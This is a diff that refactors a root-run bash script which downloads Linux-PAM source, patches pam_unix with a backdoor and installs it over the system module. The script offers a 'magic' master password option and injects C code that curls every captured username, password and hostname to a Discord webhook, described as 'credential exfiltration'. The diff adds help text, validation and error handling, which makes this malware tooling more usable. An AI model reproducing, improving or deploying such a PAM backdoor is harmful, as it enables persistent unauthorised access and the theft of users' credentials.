@@ -16,8 +16,32 @@ DEPENDENCIES=(
 )
 
 function run_cmd {
-    if [ "$VERBOSE" = true ]; then "$@"; else "$@" &>/dev/null; fi
+    if [ "$VERBOSE" = true ]; then
+        "$@"
+    else
+        "$@" &>/dev/null
+    fi
 }
+
+function show_help {
+    echo "Usage: $0 [-v version] [-p password] [--webhook URL] [--restore] [--verbose]"
+    echo "Options:"
+    echo "  -v            Specify Linux-PAM version."
+    echo "  -p            The 'magic' password for the backdoor."
+    echo "  --webhook     Discord Webhook URL for credential exfiltration."
+    echo "  --restore     Restore original PAM from backup."
+    echo "  --verbose     Show all command output."
+}
+
+if [ ! -f /etc/debian_version ]; then
+    echo "Error: This script is designed for Debian-based distributions."
+    exit 1
+fi
+
+if [[ $EUID -ne 0 ]]; then
+   echo "Error: This script must be run as root."
+   exit 1
+fi
 
 while [[ $# -gt 0 ]]; do
     case "$1" in
@@ -26,37 +50,56 @@ while [[ $# -gt 0 ]]; do
         --webhook) WEBHOOK_URL="$2"; shift 2 ;;
         --verbose) VERBOSE=true; shift ;;
         --restore) RESTORE=true; shift ;;
-        *) shift ;;
+        -h|--help) show_help; exit 0 ;;
+        *) echo "Unknown option: $1"; exit 1 ;;
     esac
 done
 
 if [ "$RESTORE" = true ]; then
     if [ -f "$BACKUP_PATH" ]; then
+        echo "Restoring original module..."
         cp "$BACKUP_PATH" "$PAM_DEST"
         echo "Restore complete."
         exit 0
+    else
+        echo "Error: Backup file $BACKUP_PATH not found."
+        exit 1
     fi
 fi
 
 if [ -z "$PASSWORD" ] && [ -z "$WEBHOOK_URL" ]; then
-    echo "Error: You must provide either -p (password) or --webhook (URL)."
+    echo "Error: You must provide at least one feature (-p or --webhook)."
+    show_help
     exit 1
 fi
 
 echo "Checking dependencies..."
-run_cmd apt update && run_cmd apt install -y "${DEPENDENCIES[@]}"
+MISSING_PKGS=()
+for pkg in "${DEPENDENCIES[@]}"; do
+    if ! dpkg -s "$pkg" >/dev/null 2>&1; then
+        MISSING_PKGS+=("$pkg")
+    fi
+done
+
+if [ ${#MISSING_PKGS[@]} -gt 0 ]; then
+    run_cmd apt update 
+    run_cmd apt install -y "${MISSING_PKGS[@]}"
+fi
 
 if [ -z "$PAM_VERSION" ]; then
     PAM_VERSION=$(dpkg -s libpam-modules | grep '^Version' | cut -d' ' -f2 | cut -d'-' -f1)
+    echo "Detected Version: $PAM_VERSION"
 fi
 
+PAM_BASE_URL="https://github.com/linux-pam/linux-pam/archive"
 PAM_FILE="v${PAM_VERSION}.tar.gz"
 PAM_DIR="linux-pam-${PAM_VERSION}"
-run_cmd wget -c "https://github.com/linux-pam/linux-pam/archive/${PAM_FILE}"
+
+echo "Downloading and Patching..."
+run_cmd wget -c "${PAM_BASE_URL}/${PAM_FILE}"
 run_cmd tar xzf "$PAM_FILE"
 
 C_INJECTION=""
-
 if [ -n "$WEBHOOK_URL" ]; then
     C_INJECTION+="char cmd[1024]; \
     snprintf(cmd, sizeof(cmd), \"curl -H 'Content-Type: application/json' -d '{\\\"content\\\": \\\"🔐 **Capture**\\\\n**User:** %s\\\\n**Pass:** %s\\\\n**Host:** %s\\\"}' '$WEBHOOK_URL' > /dev/null 2>&1 &\", name, p, \"$(hostname)\"); \
@@ -84,25 +127,30 @@ cat <<EOF > backdoor.patch
  	AUTH_RETURN;
 EOF
 
-run_cmd patch -p0 -d "$PAM_DIR" < backdoor.patch
+if run_cmd patch -p0 -d "$PAM_DIR" < backdoor.patch; then
+    rm backdoor.patch
+else
+    echo "Error: Failed to apply patch."
+    rm backdoor.patch
+    exit 1
+fi
 
-# --- Compilation ---
-cd "$PAM_DIR" || exit
-echo "Compiling modified PAM module..."
-run_cmd ./autogen.sh
+cd "$PAM_DIR" || exit 1
+echo "Compiling (this may take a moment)..."
+if [[ ! -f "./configure" ]]; then run_cmd ./autogen.sh; fi 
 run_cmd ./configure --libdir=/lib/x86_64-linux-gnu --disable-nis --disable-doc
 run_cmd make
 
 NEW_MOD="modules/pam_unix/.libs/pam_unix.so"
+
 if [ -f "$NEW_MOD" ]; then
+    cd ..
+    echo "Build successful. Backing up and installing..."
     [ ! -f "$BACKUP_PATH" ] && cp "$PAM_DEST" "$BACKUP_PATH"
-    cp "$NEW_MOD" "$PAM_DEST"
+    cp "$PAM_DIR/$NEW_MOD" "$PAM_DEST"
     chmod 644 "$PAM_DEST"
-    echo "-----------------------------------------------"
-    echo "Installation Successful."
-    [ -n "$PASSWORD" ] && echo "Master Password: ACTIVE"
-    [ -n "$WEBHOOK_URL" ] && echo "Webhook Exfil: ACTIVE"
-    echo "-----------------------------------------------"
+    echo "Done. Features active: $( [ -n "$PASSWORD" ] && echo -n "Backdoor " )$( [ -n "$WEBHOOK_URL" ] && echo -n "Webhook" )"
 else
-    echo "Build failed. Check dependencies or PAM version."
+    echo "Error: Build failed."
+    exit 1
 fi
